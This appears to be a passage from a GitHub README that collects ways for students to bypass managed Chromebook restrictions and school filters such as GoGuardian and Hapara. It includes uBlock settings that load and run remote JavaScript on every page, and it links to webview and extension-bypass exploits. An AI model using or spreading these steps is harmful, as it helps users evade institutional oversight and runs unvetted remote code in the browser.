Credit to [vk6](https://ading.dev/) for this exploit

### Further reading
- [Repository](https://github.com/ading2210/shimboot)
- [Project Website](https://shimboot.ading.dev/)

[**🔼 Back to top**](#ext-remover)

## uBlock Run *Run Code On Pages*
> [!NOTE]
> Google is deprecating mv2, so uBlock will not work as of Oct 24, and will be fully removed for enterprise as well in June 25. More info [here](https://developer.chrome.com/docs/extensions/develop/migrate/mv2-deprecation-timeline)

If your school allows the uBlock Origin Chrome extension, you can run bookmarklets with the extension.

### Requirements
- uBlock Origin

### Getting started
1. Make sure you have [uBlock Origin](https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm) installed.
2. Go to the extension's settings.
3. Under the settings tab, check the "I am an advanced user" box, then click on the small cog icon.
4. Find `userResourcesLocation` and change it from `unset` to `https://raw.githubusercontent.com/3kh0/ext-remover/main/ublockExec.js`.
5. Go to the filters tab of the settings and add the following line:
```
*##+js(execute_script.js)
```
6. Now press ctr+alt+tilde (~) to run code on the current page
7. Have fun!

[**🔼 Back to top**](#ext-remover)

## uRun - Bypass bookmarklet restrictions with uBlock
> [!NOTE]
> Google is deprecating mv2, so uBlock will not work as of Oct 24, and will be fully removed for enterprise as well in June 25. More info [here](https://developer.chrome.com/docs/extensions/develop/migrate/mv2-deprecation-timeline)

From [Inglan2](https://github.com/Inglan2)

Recently Google cracked down on bookmarklets and now they don't work (It's based on the [DeveloperToolsAvailability](https://chromeenterprise.google/policies/?policy=DeveloperToolsAvailability) policy). I wanted to run scripts still so I started making this, inspired by [uBlock Run *Run Code On Pages*](#ublock-run-run-code-on-pages), but with more features, like saving scripts.
1. Open uBlock settings
2. Enable advanced settings, and click the gear ⚙️ button

> [!CAUTION]
> DO NOT MODIFY ANYTHING ELSE ON THIS PAGE UNLESS YOU KNOW WHAT YOU ARE DOING (you probably don't), AS YOU COULD BREAK SOMETHING.

> [!TIP]
> If you mess up, go to the home of settings and at the bottom click reset to default settings

3. Add the script
> Change
> ```
> userResourcesLocation unset
> ```
> to
> ```
> userResourcesLocation https://inglan2.github.io/uRun/urun.js
> ```

> [!TIP]
> It's down the bottom
4. Set a filter to load uRun
> After closing the advanced settings tab, go to the filters tab and add this:
> ```
> *##+js(urun.js)
> ```

### Usage
Simply press Ctrl + Shift + \` to open the menu and from there you can run and create scripts. To add a script, press the ➕ button up the top right, and enter the code you would like to add (without the `javascript:` part).

[**🔼 Back to top**](#ext-remover)

## Quick View *Bypass extensions*

### Requirements
- Bookmarklets enabled

QuickView is a universal webview exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.

Go to <a href="https://quickview-exploit.pages.dev/">quickview-exploit.pages.dev</a> and follow the instructions.

### Further reading
- [Writeup](https://ading.dev/blog/posts/quickview.html)
- [Repository](https://github.com/ading2210/quickview)

[**🔼 Back to top**](#ext-remover)

## Buypass *Bypass extensions*

### What it can and can't do

- This only lasts for 3 minutes!
- Pages visited in this window will not be saved to your history, but their cookies will be saved.
- You can right-click on the window to go back and forward.
- There's no good way to make the text in the window larger.
- This won't bypass network filters.
- You can't log into non-school accounts.
- It's completely possible that some filters could read and block the data sent within the window.

### Getting started

Visit any of the links below:
- https://buypass.bypassi.com
- https://buypass.brandonprather.repl.co
- https://buypass.glitch.me
- https://buypass.netlify.app

### Further reading
- [Repository](https://github.com/bypassiwastaken/buypass)

[**🔼 Back to top**](#ext-remover) 

## Chaos *Hapara bypass*

**DevTools must not be allowed by policy to perform this exploit.**

Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow the instructions.

### Further Reading:
- [Repository](https://github.com/xlak/chaos)

[**🔼 Back to top**](#ext-remover)

## SOT Exploit *Open URLs in OneTab*

1. If you do not already have [OneTab](https://chromewebstore.google.com/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall) installed, try to.
2. Click the import button in the settings tab.
3. Copy-paste the URL you wish to visit about 100 times, and then click import.
4. Spam click the top link, then either spam escape on one of them or wait for one to load on a about:blank page.
  
Credit to [Coding4Hours](https://github.com/Coding4Hours)

[**🔼 Back to top**](#ext-remover)

## GoGuardian GoAway *GoGuardian bypass*
THIS EXPLOIT WILL NOT WORK FOR YOU IF YOU HAVE ANY EXTENSION BESIDES GOGUARDIAN

### Getting Started
1. Obviously (but still needs to be said due to skids), make sure GoGuardian is actually installed
2. Visit the [attached URL](goaway.txt) in a new tab
3. On that tab there will be a simple white screen with nothing on it, reload the page
4. If the GET request fails and you are left on an error screen (don't panic, this is intended, continue)
5. Visit `chrome://restart`` to clear cached sites from GoGuardian

Credit to akabutnice

[**🔼 Back to top**](#ext-remover)

## Microsoft Labs *Virtualbox but it got 20 doses of the COVID Vaccine*

Thanks a bunch Bill Gates

**Do this! Not drugs!**
1. Go to this website [Microsoft Labs](https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1)
2. Click the button that says "Sign in to launch VM mode."
3. Holy guacamole! You need a Microsoft Account! Use your credentials and sign in.
4. Load the virtual machine by clicking the button or if you sign it it will redirect you to it automatically.
5. The password is `pass@word1`.
6. Load in and profit!

NOTE: Sound doesn't work and a lot of websites are blocked, but it's just fun to screw around with.

(Not really) credit to mundaneunblocking

[**🔼 Back to top**](#ext-remover)
